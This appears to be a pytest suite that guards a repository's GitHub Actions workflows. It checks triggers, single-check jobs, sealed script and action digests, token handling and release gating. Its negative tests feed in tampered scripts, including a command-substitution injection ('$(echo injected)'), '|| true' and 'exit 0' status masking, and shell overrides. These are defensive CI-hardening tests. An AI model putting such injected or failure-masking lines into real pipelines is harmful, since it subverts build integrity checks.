"""The repository's workflows are a thin edge over Asymptote: each starts only on its allowed triggers and checks through one `asymptote check` call."""

from __future__ import annotations

import re
import tomllib
from copy import deepcopy
from hashlib import sha256
from json import dumps
from pathlib import Path

import pytest
import yaml

from ci.tag.use_case import PRODUCTS

ROOT = Path(__file__).resolve().parents[1]
DIRECTORY = ROOT / ".github/workflows"
WORKFLOWS = sorted(DIRECTORY.glob("*.yml"))

# The one command a job's checks are, with the product root and the groups it names: Asymptote decides what runs.
CHECK = re.compile(r"asymptote check( --root [\w./-]+)?( --groups [a-z][a-z-]*(,[a-z][a-z-]*)*)?")
# Evidence capture keeps one check's stdout, stderr and exact exit status. This is deliberately a whole-script grammar, not
# permission to run arbitrary shell commands around a check.
CAPTURE_GROUP = re.compile(r"asymptote check --groups ([a-z][a-z-]*) --format json > target/checks/\1\.json 2> target/checks/\1\.stderr")
# The release itself: a job that does not check runs one job command (`ci/<job>/command.py`) with plain arguments, which no shell
# chains anything to, or only actions (a build matrix). The values it is handed are crates.io's token, from its trusted publishing,
# and the token `gh` creates the GitHub Release with; npm and PyPI exchange the OIDC token themselves.
COMMAND = re.compile(r"uv run ci/[a-z_]+/command\.py( [\w./=-]+)*")
HANDED = {"CARGO_REGISTRY_TOKEN", "GH_TOKEN"}
# What may start a workflow: a hand run, a pull request, a push to main. A schedule starts only the workflows `SCHEDULED` names, and a
# workflow that publishes starts only by hand or on a push to main, which only a gated pull request makes; `pull_request_target`,
# which runs a fork's code with the repository's secrets, never.
ALLOWED = {"workflow_dispatch", "pull_request", "push"}
SCHEDULED = {"benchmarks.yml"}
# What may follow a job's check: uploading what its tools left (a bench's documents) as the run's artifact.
UPLOAD = "actions/upload-artifact@"
# The GitHub Release is the one step beside the job command that is not a command of its own: `gh` calls and the checksums they upload.
RELEASE_STEP = "GitHub Release"
# One release per product, over the directories of `dist/archives`, each named for its product's tag.
RELEASE_LINE = re.compile(
    r"for archives in dist/archives/\*/; do|done"
    r"|\s*(tag=\"\$\(basename \"\$archives\"\)\"|\(cd \"\$archives\" && sha256sum -- \* > SHA256SUMS\)|gh release (create|upload|edit) .*)"
)
# The steps that put the declared tools on a machine; a job command runs beside them and installs nothing itself.
SETUP = {"rustup toolchain install", "uv run --script tools/install.py"}

# This independent job is an inventory gate, not an Asymptote check. The three
# approved scripts are sealed whole: a removed build, narrowed rule set, masked
# exit, or extra shell command must require an explicit review of this contract.
FULL_INVENTORY_SCRIPTS = {
    "Build one Ruff worker and seal its artifact": "4bfd20ca1e5bf10a02068af69a944d180a7ca4076bd064ec787e33cb83009e58",
    "Build shared benchmark inventory runner": "5d8998c6e9bdfbdec286c4606f51bebb5785784a27a8afa118f7205d7e8c0f1f",
    "Verify all 413 pinned Ruff defaults": "c3aaa07327b3c8134fcd36a4cf760fbed37cd6cb3bd9be6f0836462468879adf",
}
# Each digest binds the entire pinned action step: its `uses`, inputs, id,
# condition and name. The ordered inventory also prevents inserted actions
# from changing PATH, environment or the checkout beneath sealed scripts.
FULL_INVENTORY_ACTIONS = [
    ("actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1", "3facce523aa8a0e29a937485282e18e07e2907c45914b4ce7745b674c765f3b7"),
    ("rui314/setup-mold@10ca16bf91dc22e05ebdc935cad9c75ea248f621", "29c1d451230538f43d0b400cd8f29d6d44751605fdc700c034be0ee1dd079524"),
    ("actions/setup-node@820762786026740c76f36085b0efc47a31fe5020", "7f5474ce29bf0dbdda451c45fc3e6dea65abfbbe1df98d51d9f4d0d29a599875"),
    ("actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e", "575dd3621a9046d2565240ed6cd1a03f836bdb30bf621ee41116f601aa13b2c1"),
    ("actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97", "4ff5f58fc47d55df93511f6dfea5db27c569b98f43b84e380960801b15c1761d"),
    ("astral-sh/setup-uv@c18668ad3cf93ea998bef934396af7bb5c839dc7", "39393228bcaf4b2e15bc14f2fadb3501c81f8966ef57502f9be19f86dbc3fa10"),
    ("Swatinem/rust-cache@d1527c8f67ef9af357290475d4af4b0fab8f12e0", "93dc05c5ffb39e0b24acd9de22bbdda46c973841166ede158a8d8ea3f01ca63e"),
    ("actions/cache/restore@55cc8345863c7cc4c66a329aec7e433d2d1c52a9", "c8ee43c3c99e776f1742d16763c36999907144bc3b69900a90461778414a683e"),
    ("actions/cache/save@55cc8345863c7cc4c66a329aec7e433d2d1c52a9", "109b67da612eaa7e25df38fbc0f69727c3f6bdfc18638720ec49c2e924c7ab2b"),
    ("actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9", "b9cf3ef4ae00784578aec3c3df418ccd2be3bec3c9518457e0c5f8d60856b14f"),
]
FULL_INVENTORY_ORDER = [
    *(uses for uses, _ in FULL_INVENTORY_ACTIONS[:6]),
    "Rust toolchain (rust-toolchain.toml)",
    FULL_INVENTORY_ACTIONS[6][0],
    FULL_INVENTORY_ACTIONS[7][0],
    "Install pinned tools",
    FULL_INVENTORY_ACTIONS[8][0],
    *FULL_INVENTORY_SCRIPTS,
    FULL_INVENTORY_ACTIONS[9][0],
]


def full_inventory_problems(job: dict) -> list[str]:
    """A narrow second gate: sealed worker, collector, all defaults, propagated status and receipts."""
    found = []
    steps = job.get("steps", [])
    if not steps:
        return ["full inventory has no worker, collector, verifier or receipts"]
    if set(job) != {"runs-on", "timeout-minutes", "defaults", "steps"} or job.get("runs-on") != "ubuntu-26.04" or job.get("timeout-minutes") != 360:
        found.append("full inventory must run independently on Linux and propagate failure")
    if job.get("defaults") != {"run": {"shell": "bash"}}:
        found.append("full inventory must use the reviewed Bash scripts")
    actions = [
        (step["uses"], sha256(dumps(step, sort_keys=True, separators=(",", ":")).encode()).hexdigest())
        for step in steps if "uses" in step
    ]
    if actions != FULL_INVENTORY_ACTIONS or [step.get("uses") or step.get("name") or step.get("run") for step in steps] != FULL_INVENTORY_ORDER:
        found.append("full inventory changed its ordered setup actions or action inputs")
    named = [step for step in steps if step.get("name") in FULL_INVENTORY_SCRIPTS]
    if [step.get("name") for step in named] != list(FULL_INVENTORY_SCRIPTS):
        found.append("full inventory lost or reordered its worker, collector or verifier")
    for name, expected in FULL_INVENTORY_SCRIPTS.items():
        matches = [step for step in steps if step.get("name") == name]
        run = matches[0].get("run") if len(matches) == 1 else None
        if not isinstance(run, str) or sha256(run.encode()).hexdigest() != expected:
            found.append(f"full inventory changed the reviewed {name} script")
        elif any(key in matches[0] for key in ("if", "continue-on-error", "shell")):
            found.append(f"full inventory may not skip or mask {name}")
        elif name != "Verify all 413 pinned Ruff defaults" and any(key in matches[0] for key in ("env", "working-directory")):
            found.append(f"full inventory changed the reviewed {name} build environment")
    if named and named != steps[-4:-1]:
        found.append("full inventory has steps between its builds, verifier and upload")
    extra_runs = [step.get("run") for step in steps if "run" in step and step.get("name") not in FULL_INVENTORY_SCRIPTS]
    if len(extra_runs) != len(SETUP) or any(not isinstance(run, str) for run in extra_runs) or set(extra_runs) != SETUP:
        found.append("full inventory runs an unreviewed setup command")
    if any("shell" in step or "continue-on-error" in step or "if" in step for step in steps if "run" in step):
        found.append("full inventory run steps may not override their shell or skip failures")
    if any("continue-on-error" in step for step in steps):
        found.append("full inventory steps may not mask failures")
    if any(
        "if" in step and (step.get("name"), step["if"])
        not in {
            ("Save installed tools", "steps.cargo_bin_cache.outputs.cache-hit != 'true'"),
            ("All-defaults inventory and per-rule receipts", "always()"),
        }
        for step in steps
    ):
        found.append("full inventory has an unreviewed step condition")
    if any(
        "env" in step and step.get("name") not in {"Install pinned tools", "Verify all 413 pinned Ruff defaults"}
        for step in steps
    ):
        found.append("full inventory has an unreviewed step environment")
    install = next((step for step in steps if step.get("name") == "Install pinned tools"), None)
    if install is None or install.get("env") != {"GH_TOKEN": "${{ github.token }}"}:
        found.append("full inventory changed the pinned tool installation environment")
    verifier = next((step for step in named if step.get("name") == "Verify all 413 pinned Ruff defaults"), None)
    if verifier and (verifier.get("working-directory") != "crates/ryo" or verifier.get("env") != {"RAYON_NUM_THREADS": "1"}):
        found.append("full inventory changed its pinned worker environment")
    upload = steps[-1]
    if not upload.get("uses", "").startswith(UPLOAD) or upload.get("name") != "All-defaults inventory and per-rule receipts" or upload.get("if") != "always()" or upload.get("with") != {
        "name": "ruff-all-defaults-${{ github.run_attempt }}",
        "path": "target/checks/ruff-all-defaults/",
        "include-hidden-files": True,
        "if-no-files-found": "error",
        "retention-days": 7,
    }:
        found.append("full inventory must upload complete receipts even after failure")
    return found


def triggers(workflow: dict) -> set[str]:
    """What starts the workflow. YAML 1.1, which PyYAML reads, takes the key `on` for true."""
    return set(workflow["on" if "on" in workflow else True])


def environment(job: dict) -> str | None:
    """The environment a job runs in, named alone or as `name:`."""
    named = job.get("environment")
    return named.get("name") if isinstance(named, dict) else named


def trigger_problems(name: str, workflow: dict) -> list[str]:
    """What starts the workflow that may not: a trigger outside `ALLOWED` (a schedule outside `SCHEDULED`), a push to a branch other
    than main, and anything but a hand run or a push to main for a workflow that publishes (a `publish` job, or a job in the
    `release` environment)."""
    started = triggers(workflow)
    allowed = ALLOWED | ({"schedule"} if name in SCHEDULED else set())
    found = [f"{name} starts on {each}" for each in sorted(started - allowed)]
    on = workflow["on" if "on" in workflow else True]
    if "push" in started and (on.get("push") if isinstance(on, dict) else None) != {"branches": ["main"]}:
        found.append(f"{name} starts on a push to more than main")
    jobs = workflow["jobs"]
    if ("publish" in jobs or any(environment(job) == "release" for job in jobs.values())) and started - {"workflow_dispatch", "push"}:
        found.append(f"{name} publishes, so it starts only by hand or on a push to main")
    return found


def checks(job: dict) -> list[int]:
    """The positions of the job's steps that call `asymptote check`."""
    return [index for index, step in enumerate(job["steps"]) if re.search(r"(^|\s)asymptote check\b", step.get("run", ""))]


def needs(job: dict) -> list[str]:
    """The jobs this job waits for."""
    waits = job.get("needs", [])
    return [waits] if isinstance(waits, str) else list(waits)


def captured_check(run: str) -> bool:
    """Accept only the workflow's evidence wrappers, preserving the check's streams and exit status exactly."""
    lines = run.splitlines()
    if len(lines) == 9 and (matched := CAPTURE_GROUP.fullmatch(lines[2])):
        group = matched[1]
        status = "build_status" if group == "build" else "quality_status"
        stem = f"target/checks/{group}"
        return lines == [
            "mkdir -p target/checks",
            "set +e",
            f"asymptote check --groups {group} --format json > {stem}.json 2> {stem}.stderr",
            f"{status}=$?",
            "set -e",
            f"cat {stem}.json",
            f"cat {stem}.stderr >&2",
            f"printf '%s\\n' \"${status}\" > {stem}.status",
            f'exit "${status}"',
        ]
    return lines == [
        "mkdir -p target/benchmarks/speed",
        "set +e",
        "asymptote check --groups speed --format json > target/benchmarks/speed/check.json 2> target/benchmarks/speed/check.stderr.log",
        "speed_status=$?",
        "cat target/benchmarks/speed/check.json",
        "cat target/benchmarks/speed/check.stderr.log >&2",
        'exit "$speed_status"',
    ]


def problems(workflow: dict) -> list[str]:
    """What keeps the workflow from being a thin edge over `asymptote check`: a job that calls it more than once, anywhere but
    last, or with more than the one command line; a job that does not check and runs more than one job command; a job neither
    checking, nor waiting for one that does, nor deciding what one runs (a job such a job waits for); a workflow no job of which
    checks."""
    jobs = workflow["jobs"]
    found = []
    for name, job in jobs.items():
        if name == "contract-review":
            found.extend(contract_review_problems(workflow))
            continue
        if name == "ruff-all-defaults":
            found.extend(full_inventory_problems(job))
            continue
        positions = checks(job)
        if len(positions) > 1:
            found.append(f"{name} calls asymptote check {len(positions)} times")
        elif positions:
            run = re.sub(r"\$\{\{.*?\}\}", "value", job["steps"][positions[0]]["run"].strip())
            if any(not step.get("uses", "").startswith(UPLOAD) for step in job["steps"][positions[0] + 1 :]):
                found.append(f"{name} does not end in its asymptote check step")
            if not CHECK.fullmatch(run) and not captured_check(run):
                found.append(f"{name} runs {run!r}, not one `asymptote check [--root <dir>] [--groups <groups>]`")
        else:
            steps = [step for step in job["steps"] if "run" in step and step.get("name") != RELEASE_STEP]
            runs = [re.sub(r"\$\{\{.*?\}\}", "value", step["run"].strip()) for step in steps]
            runs = [each for each in runs if each not in SETUP]
            if len(runs) > 1 or any(not COMMAND.fullmatch(each) for each in runs):
                found.append(f"{name} does not check and does not run exactly one job command: {runs}")
            for step in job["steps"]:
                if step.get("name") == RELEASE_STEP:
                    found += [f"{name} releases with {line!r}" for line in step["run"].strip().splitlines() if not RELEASE_LINE.fullmatch(line)]
            if any(set(step.get("env", {})) - HANDED for step in job["steps"]):
                found.append(f"{name} hands a step more than {sorted(HANDED)}")

    def gated(name: str, seen: frozenset[str] = frozenset()) -> bool:
        if name == "contract-review":
            return not contract_review_problems(workflow)
        if name == "ruff-all-defaults":
            return not full_inventory_problems(jobs[name])
        return bool(checks(jobs[name])) or any(gated(each, seen | {name}) for each in needs(jobs[name]) if each not in seen)

    # The jobs a gated job waits for: the ones that decide what it runs (which products a change reaches, which a push releases).
    deciding = {each for name in jobs if gated(name) for each in needs(jobs[name])}
    found += [f"{name} neither checks nor waits for a job that does" for name in jobs if not gated(name) and name not in deciding]
    if not any(checks(job) for job in jobs.values()):
        found.append("no job calls asymptote check")
    return found


def job(*run: str, needs: str | None = None) -> dict:
    """A job whose steps run the given commands in order."""
    return {"steps": [{"run": each} for each in run]} | ({"needs": needs} if needs else {})


@pytest.mark.parametrize("path", WORKFLOWS, ids=lambda path: path.name)
def test_every_workflow_runs_only_on_its_allowed_triggers(path: Path) -> None:
    """A workflow starts by hand, on a pull request or on a push to main; a schedule starts only the workflows `SCHEDULED` names, and
    a workflow that publishes starts only by hand or on a push to main. The git hook `asymptote init` installs stays the per-change gate."""
    assert trigger_problems(path.name, yaml.safe_load(path.read_text())) == []


@pytest.mark.parametrize("path", WORKFLOWS, ids=lambda path: path.name)
def test_every_workflow_checks_through_one_asymptote_call(path: Path) -> None:
    """Beside the steps that set up its machine and install the tools, a job that checks ends in one `asymptote check` call, and
    every other job of the workflow waits for one that does."""
    assert problems(yaml.safe_load(path.read_text())) == []


def test_speed_job_saves_installed_tools_before_quality_checks() -> None:
    """The independent speed guard retains its installed tools even when quality fails."""
    workflow = yaml.safe_load((DIRECTORY / "check.yml").read_text())
    action = "55cc8345863c7cc4c66a329aec7e433d2d1c52a9"
    paths = "~/.cargo/bin\n~/.cargo/.crates.toml\n~/.cargo/.crates2.json\n"
    prefix = "cargo-bin-${{ runner.os }}-${{ runner.arch }}-${{ hashFiles('tools/install.py', 'crates/*/Cargo.toml', 'tools/lints/Cargo.toml') }}"
    key = f"{prefix}-${{{{ github.sha }}}}"
    restore_keys = f"{prefix}-\ncargo-bin-${{{{ runner.os }}}}-${{{{ runner.arch }}}}-\n"
    for name in ("speed",):
        steps = workflow["jobs"][name]["steps"]
        restore = next(index for index, step in enumerate(steps) if step.get("id") == "cargo_bin_cache")
        install = next(index for index, step in enumerate(steps) if step.get("run") == "uv run --script tools/install.py")
        save = steps[install + 1]
        assert restore < install < len(steps) - 1
        assert steps[restore]["uses"] == f"actions/cache/restore@{action}"
        assert steps[restore]["with"] == {
            "path": paths,
            "key": key,
            "restore-keys": restore_keys,
        }
        assert save["uses"] == f"actions/cache/save@{action}"
        assert save["if"] == "steps.cargo_bin_cache.outputs.cache-hit != 'true'"
        assert save["with"] == {"path": paths, "key": key}
        assert any("asymptote check" in step.get("run", "") for step in steps[install + 2 :])


def test_there_are_workflows_to_hold() -> None:
    assert [path.name for path in WORKFLOWS]


def test_a_job_that_installs_and_ends_in_one_check_is_a_thin_edge() -> None:
    workflow = {"jobs": {"check": job("cargo install --path crates/asymptote/cli --locked", "asymptote check --groups lint,perf")}}
    assert problems(workflow) == []


def test_a_job_that_installs_with_the_script_and_ends_in_one_check_is_a_thin_edge() -> None:
    assert problems({"jobs": {"check": job("uv run --script tools/install.py", "asymptote check --groups test")}}) == []


def test_the_full_inventory_is_an_independent_complete_gate() -> None:
    workflow = yaml.safe_load((DIRECTORY / "check.yml").read_text())
    assert full_inventory_problems(workflow["jobs"]["ruff-all-defaults"]) == []
    assert problems(workflow) == []


@pytest.mark.parametrize(
    ("step_name", "old", "new"),
    [
        ("Build one Ruff worker and seal its artifact", "cargo bench --no-run", "true # cargo bench --no-run"),
        ("Build shared benchmark inventory runner", "cargo build --release", "true # cargo build --release"),
        ("Verify all 413 pinned Ruff defaults", "--full-inventory", "--profile PLE0115"),
        ("Verify all 413 pinned Ruff defaults", 'exit "$inventory_status"', "exit 0"),
    ],
)
def test_full_inventory_refuses_missing_builds_narrowing_and_suppressed_exit(step_name: str, old: str, new: str) -> None:
    workflow = yaml.safe_load((DIRECTORY / "check.yml").read_text())
    altered = deepcopy(workflow)
    step = next(step for step in altered["jobs"]["ruff-all-defaults"]["steps"] if step.get("name") == step_name)
    assert old in step["run"]
    step["run"] = step["run"].replace(old, new)
    assert problems(altered)


@pytest.mark.parametrize(
    ("field", "value"),
    [
        ("path", "target/checks/other/"),
        ("if-no-files-found", "warn"),
        ("include-hidden-files", False),
    ],
)
def test_full_inventory_refuses_dropped_receipts(field: str, value: object) -> None:
    workflow = yaml.safe_load((DIRECTORY / "check.yml").read_text())
    altered = deepcopy(workflow)
    altered["jobs"]["ruff-all-defaults"]["steps"][-1]["with"][field] = value
    assert problems(altered)


def test_full_inventory_name_alone_grants_no_exception() -> None:
    workflow = yaml.safe_load((DIRECTORY / "check.yml").read_text())
    altered = deepcopy(workflow)
    altered["jobs"]["ruff-all-defaults"]["steps"] = [{"run": "echo skipped"}]
    assert problems(altered)


@pytest.mark.parametrize("step_name", ["Build one Ruff worker and seal its artifact", "Build shared benchmark inventory runner", "All-defaults inventory and per-rule receipts"])
def test_full_inventory_refuses_a_dropped_required_step(step_name: str) -> None:
    workflow = yaml.safe_load((DIRECTORY / "check.yml").read_text())
    altered = deepcopy(workflow)
    steps = altered["jobs"]["ruff-all-defaults"]["steps"]
    steps[:] = [step for step in steps if step.get("name") != step_name]
    assert problems(altered)


@pytest.mark.parametrize("condition_yaml", ["false", "no", "0"])
def test_full_inventory_refuses_a_falsy_step_condition(condition_yaml: str) -> None:
    workflow = yaml.safe_load((DIRECTORY / "check.yml").read_text())
    altered = deepcopy(workflow)
    verifier = next(step for step in altered["jobs"]["ruff-all-defaults"]["steps"] if step.get("name") == "Verify all 413 pinned Ruff defaults")
    verifier["if"] = yaml.safe_load(f"if: {condition_yaml}")["if"]
    assert problems(altered)


@pytest.mark.parametrize("condition", [False, "github.event_name == 'workflow_dispatch'"])
def test_full_inventory_refuses_job_level_skips(condition: object) -> None:
    workflow = yaml.safe_load((DIRECTORY / "check.yml").read_text())
    altered = deepcopy(workflow)
    altered["jobs"]["ruff-all-defaults"]["if"] = condition
    assert problems(altered)


@pytest.mark.parametrize("shell", ["true {0}", "bash -c true {0}"])
def test_full_inventory_refuses_step_shell_overrides(shell: str) -> None:
    workflow = yaml.safe_load((DIRECTORY / "check.yml").read_text())
    altered = deepcopy(workflow)
    verifier = next(step for step in altered["jobs"]["ruff-all-defaults"]["steps"] if step.get("name") == "Verify all 413 pinned Ruff defaults")
    verifier["shell"] = shell
    assert problems(altered)


def test_full_inventory_refuses_masked_upload_and_build_environment_override() -> None:
    workflow = yaml.safe_load((DIRECTORY / "check.yml").read_text())
    masked = deepcopy(workflow)
    masked["jobs"]["ruff-all-defaults"]["steps"][-1]["continue-on-error"] = True
    assert problems(masked)
    changed = deepcopy(workflow)
    worker = next(step for step in changed["jobs"]["ruff-all-defaults"]["steps"] if step.get("name") == "Build one Ruff worker and seal its artifact")
    worker["env"] = {"CARGO_TARGET_DIR": "/tmp/other"}
    assert problems(changed)


@pytest.mark.parametrize(("field", "value"), [("ref", "main"), ("repository", "someone/else")])
def test_full_inventory_refuses_checkout_away_from_the_run_commit(field: str, value: str) -> None:
    workflow = yaml.safe_load((DIRECTORY / "check.yml").read_text())
    altered = deepcopy(workflow)
    checkout = altered["jobs"]["ruff-all-defaults"]["steps"][0]
    checkout["with"][field] = value
    assert problems(altered)


def test_full_inventory_refuses_added_or_changed_setup_actions() -> None:
    workflow = yaml.safe_load((DIRECTORY / "check.yml").read_text())
    added = deepcopy(workflow)
    added["jobs"]["ruff-all-defaults"]["steps"].insert(6, {"uses": "./.github/actions/replace-tool"})
    assert problems(added)
    changed = deepcopy(workflow)
    setup_node = next(step for step in changed["jobs"]["ruff-all-defaults"]["steps"] if step.get("uses", "").startswith("actions/setup-node@"))
    setup_node["with"]["node-version"] = 22
    assert problems(changed)


def test_full_inventory_refuses_a_job_container() -> None:
    workflow = yaml.safe_load((DIRECTORY / "check.yml").read_text())
    altered = deepcopy(workflow)
    altered["jobs"]["ruff-all-defaults"]["container"] = "example.invalid/custom:latest"
    assert problems(altered)


def test_a_job_command_runs_beside_the_steps_that_install_the_tools() -> None:
    publish = job("rustup toolchain install", "uv run --script tools/install.py", "uv run ci/release/command.py --publish", needs="check")
    assert problems({"jobs": {"check": job("asymptote check"), "publish": publish}}) == []


def test_a_job_that_waits_for_the_checking_job_is_gated_by_it() -> None:
    workflow = {"jobs": {"check": job("asymptote check"), "publish": job("uv run ci/release/command.py --publish", needs="check")}}
    assert problems(workflow) == []


def test_a_job_that_runs_more_than_its_job_command_is_refused() -> None:
    workflow = {"jobs": {"check": job("asymptote check"), "publish": job("echo", "uv run ci/release/command.py", needs="check")}}
    assert len(problems(workflow)) == 1 and "exactly one job command" in problems(workflow)[0]
    chained = {"jobs": {"check": job("asymptote check"), "publish": job("uv run ci/release/command.py && echo", needs="check")}}
    assert len(problems(chained)) == 1


def test_a_step_handed_more_than_the_tokens_is_refused() -> None:
    publish = job("uv run ci/release/command.py", needs="check")
    publish["steps"][0]["env"] = {"CARGO_REGISTRY_TOKEN": "x", "OTHER": "y"}
    assert problems({"jobs": {"check": job("asymptote check"), "publish": publish}}) == [
        "publish hands a step more than ['CARGO_REGISTRY_TOKEN', 'GH_TOKEN']"
    ]


def test_a_job_that_does_not_end_in_its_check_is_refused() -> None:
    assert problems({"jobs": {"check": job("asymptote check", "echo done")}}) == ["check does not end in its asymptote check step"]


def test_a_check_may_take_its_group_from_the_matrix_and_upload_what_its_tools_left() -> None:
    # The expression is written in pieces, since the template this file is rendered from reads two braces as its own.
    expression = "$" + "{" * 2 + " matrix.group " + "}" * 2
    checking = job("uv run --script tools/install.py", f"asymptote check --groups {expression}")
    checking["steps"].append({"uses": "actions/upload-artifact@0000000000000000000000000000000000000000", "with": {"path": "target"}})
    assert problems({"jobs": {"check": checking}}) == []


@pytest.mark.parametrize("name", ["root", "check", "speed"])
def test_each_real_check_remains_one_check(name: str) -> None:
    """The product checks and independent speed guard each contain one propagated check."""
    checking = yaml.safe_load((DIRECTORY / "check.yml").read_text())["jobs"][name]
    assert problems({"jobs": {name: checking}}) == []


@pytest.mark.parametrize(
    ("before", "after"),
    [
        ("set +e", "set +e\necho extra"),
        ("build_status=$?", "asymptote check --groups lint\nbuild_status=$?"),
        ("build_status=$?", "echo changed-status\nbuild_status=$?"),
        ("build_status=$?", "build_status=0"),
        ('exit "$build_status"', "exit 0"),
        ('exit "$build_status"', 'exit "$other_status"'),
        ("build.stderr", "other.stderr"),
        ("cat target/checks/build.json", "cat target/checks/build.json; echo extra"),
        ("--format json", "--format json --groups lint"),
        ("--format json", "--format json || true"),
        ("mkdir -p target/checks", "mkdir -p target/$(echo injected)"),
    ],
)
def test_capture_refuses_extra_commands_changed_streams_and_masked_status(before: str, after: str) -> None:
    """Finding a check inside a script never authorizes unrelated shell work or a successful exit after a failed check."""
    checking = job("\n".join([
        "mkdir -p target/checks", "set +e",
        "asymptote check --groups build --format json > target/checks/build.json 2> target/checks/build.stderr",
        "build_status=$?", "set -e", "cat target/checks/build.json",
        "cat target/checks/build.stderr >&2", "printf '%s\\n' \"$build_status\" > target/checks/build.status",
        'exit "$build_status"',
    ]))
    assert problems({"jobs": {"build": checking}}) == []
    step = checking["steps"][checks(checking)[0]]
    assert before in step["run"]
    step["run"] = step["run"].replace(before, after)
    assert problems({"jobs": {"build": checking}})


def test_speed_capture_refuses_a_second_check_or_masked_exit() -> None:
    """The shorter speed wrapper has the same one-command and status requirements."""
    workflow = yaml.safe_load((DIRECTORY / "check.yml").read_text())
    run = workflow["jobs"]["speed"]["steps"][checks(workflow["jobs"]["speed"])[0]]["run"]
    for changed in (
        run.replace("speed_status=$?", "asymptote check\nspeed_status=$?"),
        run.replace('exit "$speed_status"', "exit 0"),
    ):
        assert problems({"jobs": {"speed": job(changed)}})


def test_a_job_that_checks_twice_is_refused() -> None:
    assert problems({"jobs": {"check": job("asymptote check --groups lint", "asymptote check --groups test")}}) == [
        "check calls asymptote check 2 times"
    ]


def test_a_check_that_chains_another_command_is_refused() -> None:
    assert problems({"jobs": {"check": job("asymptote check && echo done")}}) == [
        "check runs 'asymptote check && echo done', not one `asymptote check [--root <dir>] [--groups <groups>]`"
    ]


def test_a_job_that_neither_checks_nor_waits_for_a_check_is_refused() -> None:
    workflow = {"jobs": {"check": job("asymptote check"), "publish": job("uv run ci/release/command.py --publish")}}
    assert problems(workflow) == ["publish neither checks nor waits for a job that does"]


def test_a_workflow_that_never_calls_asymptote_is_refused() -> None:
    assert "no job calls asymptote check" in problems({"jobs": {"build": job("uv run ci/release/command.py")}})


def test_a_trigger_other_than_dispatch_is_told_apart() -> None:
    pushed = yaml.safe_load("on:\n  push:\n  workflow_dispatch:\njobs: {}\n")
    dispatched = yaml.safe_load("on:\n  workflow_dispatch:\njobs: {}\n")
    assert triggers(pushed) != {"workflow_dispatch"}
    assert triggers(dispatched) == {"workflow_dispatch"}


def test_a_schedule_starts_only_the_scheduled_workflows() -> None:
    scheduled = yaml.safe_load("on:\n  schedule:\n    - cron: '0 3 * * 0'\njobs: {}\n")
    assert trigger_problems("check.yml", scheduled) == ["check.yml starts on schedule"]
    assert trigger_problems("benchmarks.yml", scheduled) == []


def test_a_pull_request_target_is_refused() -> None:
    """`pull_request_target` runs a fork's code with the repository's secrets."""
    target = yaml.safe_load("on:\n  pull_request_target:\njobs: {}\n")
    assert trigger_problems("check.yml", target) == ["check.yml starts on pull_request_target"]


def test_a_push_starts_a_workflow_only_on_main() -> None:
    main = yaml.safe_load("on:\n  push:\n    branches: [main]\njobs: {}\n")
    every = yaml.safe_load("on:\n  push:\njobs: {}\n")
    other = yaml.safe_load("on:\n  push:\n    branches: [main, release]\njobs: {}\n")
    assert trigger_problems("check.yml", main) == []
    assert trigger_problems("check.yml", every) == trigger_problems("check.yml", other) == ["check.yml starts on a push to more than main"]


def test_a_workflow_that_publishes_starts_only_by_hand_or_on_a_push_to_main() -> None:
    """A push to main is a merged pull request, which its gate checked; a pull request's own run never publishes."""
    publish = {"environment": "release", "steps": [{"run": "uv run ci/release/command.py --publish"}]}
    on_a_pull_request = {"on": {"workflow_dispatch": None, "pull_request": None}, "jobs": {"publish": publish}}
    assert trigger_problems("release.yml", on_a_pull_request) == ["release.yml publishes, so it starts only by hand or on a push to main"]
    by_hand = {"on": {"workflow_dispatch": None}, "jobs": {"upload": {"environment": {"name": "release"}, "steps": []}}}
    assert trigger_problems("release.yml", by_hand) == []
    on_a_push = by_hand | {"on": {"push": {"branches": ["main"]}, "workflow_dispatch": None}}
    assert trigger_problems("release.yml", on_a_push) == []
    on_any_push = by_hand | {"on": {"push": None}}
    assert trigger_problems("release.yml", on_any_push) == ["release.yml starts on a push to more than main"]


def test_a_job_that_decides_what_a_gated_job_runs_is_gated_by_it() -> None:
    """The jobs a gated job waits for, such as the one naming the products a change reaches, need not check themselves."""
    changes = {"steps": [{"uses": "dorny/paths-filter@0000000000000000000000000000000000000000"}]}
    workflow = {"jobs": {"changes": changes, "check": job("asymptote check", needs="changes")}}
    assert problems(workflow) == []
    tagging = {"jobs": {"tag": job("uv run ci/tag/command.py --push"), "check": job("asymptote check"), "build": job(needs="check")}}
    tagging["jobs"]["build"]["needs"] = ["tag", "check"]
    assert problems(tagging) == []


def test_only_the_release_job_that_uploads_is_handed_a_token_and_only_after_the_maintainer_s_gate() -> None:
    """The registry token reaches the one job that publishes, and only when all three of the gate hold (`PUBLISH`): a dry run
    never holds it."""
    workflow = yaml.safe_load((DIRECTORY / "release.yml").read_text())
    handed = {
        name
        for name, defined in workflow["jobs"].items()
        if any("CARGO_REGISTRY_TOKEN" in step.get("env", {}) for step in defined["steps"])
    }
    assert handed == {"publish"}
    publish = workflow["jobs"]["publish"]
    assert publish["environment"] == "release" and "RELEASE_MAINTAINER" in publish["env"]["PUBLISH"]
    # A push to main publishes the products it tagged; a hand run, one product, only from its own tag.
    assert publish["env"]["PUBLISH"].startswith("${{ github.event_name == 'push' || (inputs.publish && ")
    assert "startsWith(github.ref_name, format('idiomatic-sh-{0}-v', matrix.product))" in publish["env"]["PUBLISH"]
    (product,) = [workflow["on" if "on" in workflow else True]["workflow_dispatch"]["inputs"]["product"]]
    assert product["required"] is True and product["options"] == ["ryo", "tastemaker", "asymptote"]
    (command,) = [step["run"] for step in publish["steps"] if "ci/release/command.py" in step.get("run", "")]
    assert "--product ${{ matrix.product }}" in command
    (checking,) = [step["run"] for step in workflow["jobs"]["check"]["steps"] if "asymptote check" in step.get("run", "")]
    assert checking == "asymptote check --root ${{ matrix.root || format('crates/{0}', inputs.product) }} --groups ${{ matrix.group }}"
    # Every product's release tools, one job per group: each group a product's asymptote.toml names beside lint, check, perf and
    # build is a row of the matrix, and every row is a group some product names.
    released = {
        tool["group"]
        for manifest in sorted(ROOT.glob("crates/*/asymptote.toml"))
        for tool in tomllib.loads(manifest.read_text())["tools"]
        if tool["group"].startswith("release")
    }
    rows = workflow["jobs"]["check"]["strategy"]["matrix"]["include"]
    assert {row["group"] for row in rows} == released | {"lint", "clippy", "api", "check"}
    # A hand run's check, the pull request gate's rows for its product: lint from the root, the tests on every machine.
